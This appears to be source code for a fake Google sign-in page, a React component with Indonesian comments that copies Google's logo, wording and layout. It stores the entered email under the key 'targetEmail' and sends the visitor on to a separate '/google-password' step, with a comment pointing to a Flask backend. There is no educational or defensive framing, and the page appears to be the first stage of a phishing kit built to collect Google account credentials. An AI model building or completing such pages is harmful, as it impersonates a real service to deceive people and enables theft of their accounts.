import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';

export default function GoogleLogin() {
  const [email, setEmail] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const navigate = useNavigate()

  const handleSubmit = (e) => {
    e.preventDefault();
    setIsLoading(true);

    // 1. Simpan email ke dalam memori browser (localStorage)
    localStorage.setItem('targetEmail', email);

    // 2. Langsung alihkan ke halaman password di server Backend (Flask)
    // Ganti 5000 dengan port backend Python Anda jika berbeda
    navigate('/google-password')
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-[#f0f2f5] font-sans selection:bg-blue-200">
      
      {/* Kotak Card Utama bergaya Google */}
      <div className="bg-white border border-gray-200/60 rounded-xl p-9 w-full max-w-[450px] shadow-sm">
        
        {/* Header: Logo & Teks */}
        <div className="text-center mb-8">
        <svg className="w-5 h-5" viewBox="0 0 24 24">
                <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
                <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
                <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
                <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
              </svg>
          <h1 className="text-2xl text-gray-900 font-normal mb-2">Sign in</h1>
          <p className="text-gray-900 text-base">Use your Google Account</p>
        </div>

        {/* Form Input */}
        <form onSubmit={handleSubmit}>
          
          {/* Input dengan efek Floating Label ala Google */}
          <div className="relative mb-2">
            <input 
              type="text" 
              id="email" 
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="block w-full px-4 py-3.5 text-base text-gray-900 bg-transparent border border-gray-300 rounded-md appearance-none focus:outline-none focus:ring-0 focus:border-blue-600 peer"
              placeholder=" " 
              required 
            />
            <label 
              htmlFor="email" 
              className="absolute text-gray-500 duration-200 transform -translate-y-4 scale-75 top-3 z-10 origin-[0] bg-white px-1 peer-focus:px-1 peer-focus:text-blue-600 peer-placeholder-shown:scale-100 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:top-1/2 peer-focus:top-3 peer-focus:scale-75 peer-focus:-translate-y-4 left-3"
            >
              Email or phone
            </label>
          </div>

          {/* Link Forgot Email */}
          <div className="mb-8">
            <a href="#" className="text-blue-600 font-medium text-sm hover:underline rounded">
              Forgot email?
            </a>
          </div>

          {/* Keterangan Guest Mode */}
          <div className="mb-10 text-sm text-gray-600">
            Not your computer? Use Guest mode to sign in privately. <br/>
            <a href="#" className="text-blue-600 font-medium hover:underline">
              Learn more
            </a>
          </div>

          {/* Tombol Aksi */}
          <div className="flex items-center justify-between mt-6">
            <button 
              type="button" 
              className="text-blue-600 font-medium text-sm hover:bg-blue-50 px-4 py-2.5 rounded-md transition-colors -ml-2"
            >
              Create account
            </button>
            
            <button 
              type="submit" 
              disabled={isLoading}
              className="bg-blue-600 hover:bg-blue-700 text-white font-medium text-sm px-6 py-2.5 rounded-md transition-colors disabled:opacity-70 disabled:cursor-not-allowed"
            >
              {isLoading ? 'Memuat...' : 'Next'}
            </button>
          </div>

        </form>
      </div>
    </div>
  );
}